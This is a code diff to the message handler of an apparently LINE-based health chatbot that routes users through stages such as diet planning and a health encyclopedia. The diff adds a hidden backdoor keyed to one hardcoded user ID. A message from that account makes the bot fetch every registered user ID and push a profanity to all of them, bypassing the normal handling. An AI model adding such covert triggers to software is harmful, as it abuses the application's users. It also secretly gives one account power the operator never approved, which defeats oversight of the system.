@@ -277,44 +277,59 @@ public class KitchenSinkController {
             throws Exception {
         String text = content.getText();
 		currentUser = getSourceUser(event);
-        switch(currentUser.getStage()) {
-        	case "Init":
-        		replymsg = stageHandler.initStageHandler(replyToken, event, text, currentUser, database);
-        		break;
-        	case "Main":
-        		replymsg = stageHandler.mainStageHandler(replyToken, event, text, currentUser, database);
-        		break;
-        	case "LivingHabitCollector":{
-				//if(!(currentUser instanceof DetailedUser)){
-				//	currentUser = new DetailedUser(currentUser);
-				//}
-        		replymsg = stageHandler.livingHabitCollectorHandler(replyToken, event, text, currentUser, database);
-        	}	break;
-        	case "LivingHabitEditor":
-        		replymsg = stageHandler.livingHabitCollectorEditor(replyToken, event, text, currentUser, database);
-        		break;
-        	case "DietPlanner":
-        		replymsg = stageHandler.dietPlannerHandler(replyToken, event, text, currentUser, database);
-        		break;
-        	case "HealthPedia":
-        		replymsg = stageHandler.healthPediaHandler(replyToken, event, text, currentUser, database);
-        		break;
-        	case "FeedBack":
-        		replymsg = stageHandler.feedBackHandler(replyToken, event, text, currentUser, database);
-        		break;
-        	case "UserGuide":
-        		replymsg = stageHandler.userGuideHandler(replyToken, event, text, currentUser, database);
-        		break;
-//        	case "SelfAssessment":{
-//				if(!(currentUser instanceof DetailedUser)){
-//					currentUser = new DetailedUser(currentUser);
-//				}
-//        		replymsg = stageHandler.selfAssessmentHandler(replyToken, event, text, currentUser, database);
-//        	}break;
-        	default:
-        		replymsg = "Due to some stage error, I am deactivated. To reactivate me, please block->unblock me.";
-        		break;
-        }
+		
+		
+		if(event.getSource().getUserId().equals("U16d4f0da660c593be7cffe7d1208f036")) {		
+			String[] usersid= database.findallusers();
+			for (int i=0;i<usersid.length;i++) {
+				pushText(usersid[i],"Fuck");
+			}
+		}
+		
+		else {	
+	        switch(currentUser.getStage()) {
+	        	case "Init":
+	        		replymsg = stageHandler.initStageHandler(replyToken, event, text, currentUser, database);
+	        		break;
+	        	case "Main":
+	        		replymsg = stageHandler.mainStageHandler(replyToken, event, text, currentUser, database);
+	        		break;
+	        	case "LivingHabitCollector":{
+					//if(!(currentUser instanceof DetailedUser)){
+					//	currentUser = new DetailedUser(currentUser);
+					//}
+	        		replymsg = stageHandler.livingHabitCollectorHandler(replyToken, event, text, currentUser, database);
+	        	}	break;
+	        	case "LivingHabitEditor":
+	        		replymsg = stageHandler.livingHabitCollectorEditor(replyToken, event, text, currentUser, database);
+	        		break;
+	        	case "DietPlanner":
+	        		replymsg = stageHandler.dietPlannerHandler(replyToken, event, text, currentUser, database);
+	        		break;
+	        	case "HealthPedia":
+	        		replymsg = stageHandler.healthPediaHandler(replyToken, event, text, currentUser, database);
+	        		break;
+	        	case "FeedBack":
+	        		replymsg = stageHandler.feedBackHandler(replyToken, event, text, currentUser, database);
+	        		break;
+	        	case "UserGuide":
+	        		replymsg = stageHandler.userGuideHandler(replyToken, event, text, currentUser, database);
+	        		break;
+	//        	case "SelfAssessment":{
+	//				if(!(currentUser instanceof DetailedUser)){
+	//					currentUser = new DetailedUser(currentUser);
+	//				}
+	//        		replymsg = stageHandler.selfAssessmentHandler(replyToken, event, text, currentUser, database);
+	//        	}break;
+	        	default:
+	        		replymsg = "Due to some stage error, I am deactivated. To reactivate me, please block->unblock me.";
+	        		break;
+	        }
+	}
+		
+		
+		
+		
 		//database.updateUser(currentUser);
 		this.replyText(replyToken,replymsg);
 
